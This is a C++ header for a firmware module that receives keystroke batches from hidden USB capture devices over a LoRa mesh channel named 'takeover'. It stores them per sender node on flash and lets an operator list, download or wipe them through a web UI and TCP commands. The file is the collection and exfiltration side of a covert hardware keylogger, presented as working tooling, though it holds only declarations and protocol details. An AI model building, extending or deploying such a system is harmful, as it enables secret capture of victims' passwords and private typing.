/**
 * @file KeylogReceiverModule.h
 * @brief Keylog receiver module for Heltec V4 base station
 *
 * Receives keystroke batches from XIAO USB capture devices via port 490,
 * stores them to flash filesystem, and sends ACK responses.
 * File management is handled via the Web UI at /keylogs.html
 *
 * Architecture (v7.7 - Web UI Only):
 *  - Inherits from SinglePortModule for mesh message handling
 *  - Uses LittleFS for persistent storage on ESP32 flash
 *  - Stores data in /keylogs/<node_id_hex>/keylog_<date>.txt
 *  - Sends "ACK:0x<batch_id>:!<receiver_node>" broadcasts for reliable delivery
 *  - Listens on channel 1 "takeover" for mesh broadcasts
 *  - File browsing/download/delete via HTTP Web UI (ContentHandler.cpp)
 *
 * Protocol (Mesh - XIAO -> Heltec):
 *  - Port: 490 (custom private port)
 *  - Channel: 1 "takeover" with PSK encryption
 *  - Incoming: [batch_id:4][data:N] or [magic:2][version:2][batch_id:4][data:N]
 *  - Outgoing ACK: "ACK:0x<8 hex digits>:!<8 hex node>" (broadcast)
 *
 * NASA Power of 10 Compliance:
 *  - Fixed buffer sizes with compile-time bounds
 *  - Assertions for all pointer operations
 *  - No dynamic memory allocation after init
 *  - All loops have fixed upper bounds
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "configuration.h"

#ifdef KEYLOG_RECEIVER_ENABLED

#include "SinglePortModule.h"
#include "concurrency/OSThread.h"

/**
 * @brief Buffer and path size constants
 */
#define KEYLOG_MAX_PATH_LEN         64      /**< Maximum file path length */
#define KEYLOG_MAX_PAYLOAD_SIZE     512     /**< Maximum incoming payload size */
#define KEYLOG_ACK_BUFFER_SIZE      32      /**< Size for "ACK:0x12345678:!12345678\0" */
#define KEYLOG_BATCH_HEADER_SIZE    4       /**< batch_id is 4 bytes (old format) */
#define KEYLOG_NODE_HEX_LEN         9       /**< 8 hex chars + null */

/**
 * @brief Protocol Version Detection (REQ-PROTO-001)
 *
 * Backwards-compatible protocol versioning using magic markers.
 * Detection logic:
 * - If bytes[0..1] == 0x55 0x4B ("UK"), it's new format v1.0+
 *   - Header: [magic:2][version:2][batch_id:4][data:N] = 8 bytes header
 * - Otherwise, it's old format (legacy)
 *   - Header: [batch_id:4][data:N] = 4 bytes header
 */
#define KEYLOG_PROTOCOL_MAGIC_0     0x55    /**< Magic byte 0 ('U') */
#define KEYLOG_PROTOCOL_MAGIC_1     0x4B    /**< Magic byte 1 ('K' for USB Keylog) */
#define KEYLOG_NEW_HEADER_SIZE      8       /**< magic(2) + version(2) + batch_id(4) */

/**
 * @brief Port and channel configuration
 * Must match USBCaptureModule.h settings
 */
#define KEYLOG_RECEIVER_PORTNUM     490     /**< Custom port for USB capture (private range 256-511) */
#define KEYLOG_RECEIVER_CHANNEL     1       /**< Channel 1 "takeover" for mesh broadcast */

/**
 * @brief Statistics tracking constants
 */
#define KEYLOG_STATS_LOG_INTERVAL_MS 60000  /**< Log stats every 60 seconds */

/**
 * @brief Command response buffer sizes (v7.9 - TCP Commands)
 */
#define KEYLOG_MAX_RESPONSE_SIZE     8192   /**< Maximum command response size (no LoRa limit via TCP) */
#define KEYLOG_MAX_COMMAND_LEN       128    /**< Maximum command string length */
#define KEYLOG_MAX_FILENAME_LEN      32     /**< Maximum filename length (keylog_YYYY-MM-DD.txt) */

/**
 * @brief Deduplication cache constants
 * NASA Rule 3: Fixed sizes determined at compile time
 */
#define DEDUP_MAX_NODES        16     /**< Max concurrent sender nodes (LRU eviction) */
#define DEDUP_BATCHES_PER_NODE 16     /**< Recent batches tracked per node */
#define DEDUP_CACHE_FILE       "/keylogs/.dedup_cache"  /**< Flash persistence file */
#define DEDUP_CACHE_MAGIC      0xDEDC /**< Magic number for file validation */
#define DEDUP_CACHE_VERSION    1      /**< Format version for compatibility */
#define DEDUP_SAVE_INTERVAL_MS 30000  /**< Debounce flash writes (30 sec) */

/**
 * @brief Deduplication cache entry for one sender node
 * NASA Rule 3: Fixed-size structure, no dynamic allocation
 * NASA Rule 7: Simple struct with minimal pointer use
 *
 * Memory layout: 4 + 4 + 64 + 1 + 1 + 2 = 76 bytes per entry
 */
struct DedupNodeEntry {
    NodeNum nodeId;                                    /**< 0 = empty slot */
    uint32_t lastAccessTime;                           /**< For LRU eviction (seconds since boot) */
    uint32_t recentBatchIds[DEDUP_BATCHES_PER_NODE];   /**< Circular buffer of batch IDs */
    uint8_t nextIdx;                                   /**< Next write position in circular buffer */
    uint8_t count;                                     /**< Valid entries (0-16) */
    uint8_t padding[2];                                /**< Alignment padding */
};

/**
 * @brief Header for dedup cache file
 * NASA Rule 6: Magic number enables validation of file integrity
 */
struct DedupCacheHeader {
    uint16_t magic;      /**< DEDUP_CACHE_MAGIC for validation */
    uint16_t version;    /**< DEDUP_CACHE_VERSION for compatibility */
    uint32_t nodeCount;  /**< Number of active node entries */
};

/**
 * @brief Keylog command types (v7.9 - TCP Commands)
 *
 * Commands sent from iOS app via TCP to Heltec for local filesystem operations.
 * These are handled entirely on Heltec (no mesh transmission).
 *
 * Format: "KEYLOG:<command>[:<parameters>]"
 */
enum KeylogCommand {
    KEYLOG_CMD_UNKNOWN = 0,
    KEYLOG_CMD_LIST,        // "KEYLOG:LIST" - List all nodes and files (JSON)
    KEYLOG_CMD_GET,         // "KEYLOG:GET:<nodeId>:<filename>" - Get file content
    KEYLOG_CMD_DELETE,      // "KEYLOG:DELETE:<nodeId>:<filename>" - Delete file
    KEYLOG_CMD_STATS,       // "KEYLOG:STATS" - Filesystem statistics (JSON)
    KEYLOG_CMD_ERASE_ALL    // "KEYLOG:ERASE_ALL" - Delete all keylog files
};

/**
 * @brief Keylog Receiver Module for Heltec V4
 *
 * Receives keystroke batches from XIAO devices and stores to flash.
 * Implements reliable delivery via ACK responses.
 * File management handled by Web UI (/keylogs.html).
 *
 * Storage Structure:
 *   /keylogs/
 *     <node_id_hex>/           e.g., /keylogs/a1b2c3d4/
 *       keylog_2025-12-13.txt  Day-based log files (append mode)
 */
class KeylogReceiverModule : public SinglePortModule, private concurrency::OSThread
{
  public:
    /**
     * @brief Constructor
     * Initializes SinglePortModule with port 490
     */
    KeylogReceiverModule();

    /**
     * @brief Initialize the module
     * Creates /keylogs directory if it doesn't exist
     * @return true if initialization successful
     */
    bool init();

    /**
     * @brief Periodic task - saves dedup cache if needed
     * @return milliseconds until next call
     */
    virtual int32_t runOnce() override;

  protected:
    // ==================== MeshModule Interface ====================

    /**
     * @brief Handle received mesh packets
     * Processes incoming keystroke batches, stores to flash, sends ACK
     *
     * @param mp Received mesh packet
     * @return ProcessMessage::STOP if handled, CONTINUE otherwise
     */
    virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;

  private:
    // ==================== Storage Operations ====================

    /**
     * @brief Store keystroke batch to flash filesystem
     *
     * @param from Source node ID
     * @param batchId Batch ID for ACK correlation
     * @param data Keystroke data (after batch_id header)
     * @param len Length of keystroke data
     * @return true if stored successfully
     */
    bool storeKeystrokeBatch(NodeNum from, uint32_t batchId,
                             const uint8_t *data, size_t len);

    /**
     * @brief Ensure node directory exists
     *
     * @param nodeId Node ID to create directory for
     * @return true if directory exists or was created
     */
    bool ensureNodeDirectory(NodeNum nodeId);

    /**
     * @brief Get log file path for a node
     *
     * @param nodeId Node ID
     * @param pathBuf Output buffer for path (must be KEYLOG_MAX_PATH_LEN)
     * @return true if path was generated successfully
     */
    bool getLogFilePath(NodeNum nodeId, char *pathBuf);

    // ==================== ACK Operations ====================

    /**
     * @brief Send ACK response to sender
     *
     * @param to Destination node ID
     * @param batchId Batch ID to acknowledge
     * @return true if ACK was queued successfully
     */
    bool sendAck(NodeNum to, uint32_t batchId);

    // ==================== Statistics ====================

    uint32_t totalBatchesReceived;  /**< Total batches received */
    uint32_t totalBatchesStored;    /**< Batches successfully stored */
    uint32_t totalAcksSent;         /**< ACKs successfully sent */
    uint32_t storageErrors;         /**< Storage operation failures */
    uint32_t lastStatsLog;          /**< Last stats log timestamp */

    // ==================== Deduplication Cache ====================
    // NASA Rule 3: Fixed-size array, no dynamic allocation
    // NASA Rule 7: Single-level pointer access only

    DedupNodeEntry dedupCache[DEDUP_MAX_NODES];  /**< Per-node dedup tracking */
    uint32_t duplicatesDetected;                  /**< Stats: duplicate batches rejected */
    uint32_t lastDedupSave;                       /**< Timestamp of last flash save */
    bool dedupCacheDirty;                         /**< True if cache needs saving */

    // ==================== Deduplication Methods ====================

    /**
     * @brief Check if batch was already received from this node
     * NASA Rule 1: No recursion, simple control flow
     * NASA Rule 2: Fixed loop bounds (DEDUP_MAX_NODES, DEDUP_BATCHES_PER_NODE)
     *
     * @param from Source node ID
     * @param batchId Batch ID to check
     * @return true if duplicate (already received), false if new
     */
    bool isDuplicateBatch(NodeNum from, uint32_t batchId);

    /**
     * @brief Record a received batch in the dedup cache
     * NASA Rule 3: No dynamic allocation (uses fixed cache)
     * NASA Rule 5: Variables at smallest scope
     *
     * @param from Source node ID
     * @param batchId Batch ID to record
     */
    void recordReceivedBatch(NodeNum from, uint32_t batchId);

    /**
     * @brief Find existing node entry or create new one (LRU eviction if full)
     * NASA Rule 1: No recursion
     * NASA Rule 2: Fixed loop bounds
     * NASA Rule 7: Returns pointer to static array element (no heap)
     *
     * @param nodeId Node ID to find or create entry for
     * @return Pointer to node entry (never null - uses LRU eviction)
     */
    DedupNodeEntry* findOrCreateNodeEntry(NodeNum nodeId);

    /**
     * @brief Load dedup cache from flash filesystem
     * NASA Rule 6: All return values checked
     * NASA Rule 3: Uses fixed-size buffer (no heap)
     *
     * @return true if cache loaded successfully, false for fresh start
     */
    bool loadDedupCache();

    /**
     * @brief Save dedup cache to flash filesystem
     * NASA Rule 6: All return values checked
     * NASA Rule 2: Fixed loop bound for counting nodes
     *
     * @return true if saved successfully
     */
    bool saveDedupCache();

    /**
     * @brief Save cache if dirty and debounce interval elapsed
     * NASA Rule 1: Simple control flow (early returns)
     */
    void saveDedupCacheIfNeeded();

    // ==================== Command Handling (v7.9 - TCP Commands) ====================

    /**
     * @brief Parse KEYLOG command from payload
     * NASA Rule 1: Simple control flow
     * NASA Rule 6: Validates input bounds
     *
     * @param payload Command string (ASCII)
     * @param len Payload length
     * @return Parsed command type
     */
    KeylogCommand parseKeylogCommand(const uint8_t *payload, size_t len);

    /**
     * @brief Execute KEYLOG command and generate response
     * NASA Rule 2: Fixed loop bounds in all handlers
     * NASA Rule 6: All return values checked
     *
     * @param cmd Command to execute
     * @param payload Original command payload (for parameter extraction)
     * @param payloadLen Length of payload
     * @param response Buffer for response text
     * @param maxLen Maximum response buffer size
     * @return Length of response text (0 on error)
     */
    size_t executeKeylogCommand(KeylogCommand cmd, const uint8_t *payload, size_t payloadLen,
                                char *response, size_t maxLen);

    /**
     * @brief Send command response back to originator
     * NASA Rule 6: Validates buffer size
     *
     * @param response Response text
     * @param len Response length
     * @param to Destination node (originator of command)
     * @return true if sent successfully
     */
    bool sendCommandResponse(const char *response, size_t len, NodeNum to);

    // ==================== Individual Command Handlers ====================

    /**
     * @brief Handle KEYLOG:LIST command - list all nodes and files
     * NASA Rule 2: Fixed directory scan bounds
     *
     * @param response Buffer for JSON response
     * @param maxLen Maximum buffer size
     * @return Length of response (0 on error)
     */
    size_t handleListCommand(char *response, size_t maxLen);

    /**
     * @brief Handle KEYLOG:GET command - get file content
     * NASA Rule 6: File size validation
     *
     * @param nodeId Node ID (hex string)
     * @param filename Filename
     * @param response Buffer for file content
     * @param maxLen Maximum buffer size
     * @return Length of response (0 on error)
     */
    size_t handleGetCommand(const char *nodeId, const char *filename,
                           char *response, size_t maxLen);

    /**
     * @brief Handle KEYLOG:DELETE command - delete file
     * NASA Rule 6: Path validation
     *
     * @param nodeId Node ID (hex string)
     * @param filename Filename
     * @param response Buffer for success message
     * @param maxLen Maximum buffer size
     * @return Length of response (0 on error)
     */
    size_t handleDeleteCommand(const char *nodeId, const char *filename,
                              char *response, size_t maxLen);

    /**
     * @brief Handle KEYLOG:STATS command - filesystem statistics
     * NASA Rule 2: Fixed directory scan bounds
     *
     * @param response Buffer for JSON response
     * @param maxLen Maximum buffer size
     * @return Length of response (0 on error)
     */
    size_t handleStatsCommand(char *response, size_t maxLen);

    /**
     * @brief Handle KEYLOG:ERASE_ALL command - delete all files
     * NASA Rule 2: Fixed directory scan bounds
     *
     * @param response Buffer for success message
     * @param maxLen Maximum buffer size
     * @return Length of response (0 on error)
     */
    size_t handleEraseAllCommand(char *response, size_t maxLen);
};

extern KeylogReceiverModule *keylogReceiverModule;

#endif /* KEYLOG_RECEIVER_ENABLED */
